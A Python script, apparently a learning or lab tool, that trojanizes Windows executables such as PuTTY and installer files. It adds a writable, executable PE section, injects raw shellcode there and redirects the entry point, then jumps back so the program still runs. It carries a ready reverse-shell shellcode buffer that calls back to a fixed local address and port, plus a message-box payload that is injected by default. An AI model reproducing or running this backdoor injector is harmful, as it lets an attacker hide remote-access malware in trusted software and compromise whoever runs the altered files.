import pefile
import mmap
import os


exe_id = 1

exe_paths = [   "PE_Validation.exe",
                "processhacker-2.39-setup.exe",
                "dbforgemysql82exp.exe",
                "putty.exe",]

# Reverse Shell
reverse_shell =  b""
reverse_shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
reverse_shell += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
reverse_shell += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
reverse_shell += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
reverse_shell += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
reverse_shell += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
reverse_shell += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
reverse_shell += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
reverse_shell += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
reverse_shell += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
reverse_shell += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
reverse_shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
reverse_shell += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
reverse_shell += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
reverse_shell += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x0a\x01\x68"
reverse_shell += b"\x02\x00\x11\x51\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
reverse_shell += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
reverse_shell += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
reverse_shell += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
reverse_shell += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
reverse_shell += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
reverse_shell += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
reverse_shell += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
reverse_shell += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
reverse_shell += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

# Show MessageBox
message_box =  b""
message_box += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
message_box += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
message_box += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
message_box += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
message_box += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
message_box += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
message_box += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
message_box += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
message_box += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
message_box += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
message_box += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
message_box += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
message_box += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
message_box += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
message_box += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
message_box += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x31\x58\x20\x20\x68"
message_box += b"\x32\x31\x41\x30\x68\x46\x30\x38\x39\x31\xdb\x88\x5c"
message_box += b"\x24\x09\x89\xe3\x68\x79\x58\x20\x20\x68\x6e\x65\x61"
message_box += b"\x6b\x68\x6b\x79\x20\x73\x68\x73\x6e\x65\x61\x31\xc9"
message_box += b"\x88\x4c\x24\x0d\x89\xe1\x31\xd2\x52\x53\x51\x52\xff"
message_box += b"\xd0\x31\xc0\x50\xff\x55\x08"

# Redirect -> Original Entry Point
#buf = buf[:-6] + b"\xB8\x00\x10\x40\x00\xFF\xD0" # 00401000 PE_Validation
#buf = buf[:-6] + b"\xB8\xf8\xa5\x40\x00\xFF\xD0" # 0040a5f8 processhacker
#buf = buf[:-6] + b"\xB8\xd0\xaa\x40\x00\xFF\xD0" # 0040aad0 dbforgemysql82exp
#buf = buf[:-6] + b"\xB8\xc6\xf8\x46\x00\xFF\xD0" # 0046f8c6 putty

OEPs = [b"\xB8\x00\x10\x40\x00\xFF\xD0", 
        b"\xB8\xf8\xa5\x40\x00\xFF\xD0",
        b"\xB8\xd0\xaa\x40\x00\xFF\xD0",
        b"\xB8\xc6\xf8\x46\x00\xFF\xD0"]

shellcode = message_box[:-6] + OEPs[exe_id]
exe_path = exe_paths[exe_id]

def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) // alignment) * alignment

# 0. Increase the file size
print("[*] 0. Resize the Executable")

original_size = os.path.getsize(exe_path)
print("\t[+] Original Size = %d" % original_size)
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()
print("\t[+] New Size = %d bytes\n" % os.path.getsize(exe_path))


# 1. Create a Section Header
print("[*] 1. Add the New Section Header")

pe = pefile.PE(exe_path)
last_section = pe.FILE_HEADER.NumberOfSections - 1
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
new_section_offset = (pe.sections[last_section].get_file_offset() + 40)

print("\t[] file_alignment = %s" % file_alignment)
print("\t[] section_alignment = %s" % section_alignment)
print("\t[] new_section_offset = %s" % new_section_offset)
print("\t[] pe.OPTIONAL_HEADER.ImageBase = %s" % hex(pe.OPTIONAL_HEADER.ImageBase))


# Create the section
'''
Name
VirtualSize
VirtualAddress
SizeOfRawData
PointerToRawData
Characteristics
'''
#  Section name  8 bytes
name = bytes(".myname" + (1 * '\x00'), 'UTF-8')
virtual_size = align(0x1000, section_alignment)
virtual_address = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)


size_of_raw_data = align(0x1000, file_alignment)                     
pointer_to_raw_data = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)


# EXECUTE, READ, WRITE, CODE
characteristics = 0xE0000020

pe.set_bytes_at_offset(new_section_offset, name)
pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
pe.set_dword_at_offset(new_section_offset + 12, virtual_address)
pe.set_dword_at_offset(new_section_offset + 16, size_of_raw_data)
pe.set_dword_at_offset(new_section_offset + 20, pointer_to_raw_data)
#  0
pe.set_bytes_at_offset(new_section_offset + 24, (12 * b'\x00'))
pe.set_dword_at_offset(new_section_offset + 36, characteristics)

print("\t[+] Section Name = %s" % name)
print("\t[+] VirtualSize = %s" % hex(virtual_size))
print("\t[+] VirtualAddress = %s" % hex(virtual_address))
print("\t[+] SizeOfRawData = %s" % hex(size_of_raw_data))
print("\t[+] PointerToRawData = %s" % hex(pointer_to_raw_data))
print("\t[+] Characteristics = %s\n" % hex(characteristics))



# 2.  Header 
print("[*] 2. Modify the Main Headers")

pe.FILE_HEADER.NumberOfSections += 1
pe.OPTIONAL_HEADER.SizeOfImage = virtual_address + virtual_size 

print("\t[+] Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections)
print("\t[+] Size of Image = %d bytes\n" % pe.OPTIONAL_HEADER.SizeOfImage)



# 3.  Shellcode  Section
print("[*] 3. Inject the Shellcode in the New Section")

last_section = pe.FILE_HEADER.NumberOfSections - 1
pe.write(exe_path)
pe = pefile.PE(exe_path) # reload pe file

pointer_to_raw_data = pe.sections[last_section].PointerToRawData
pe.set_bytes_at_offset(pointer_to_raw_data, shellcode)

print("\t[+] Shellcode wrote in the new section\n")

# 4.  OEP
print("[*] 4. Modify Original Entry Point")
print("\t[+] Original Entry Point = %s" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))

new_ep = pe.sections[last_section].VirtualAddress
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

print("\t[+] New Entry Point = %s" % hex(new_ep))

pe.write(exe_path)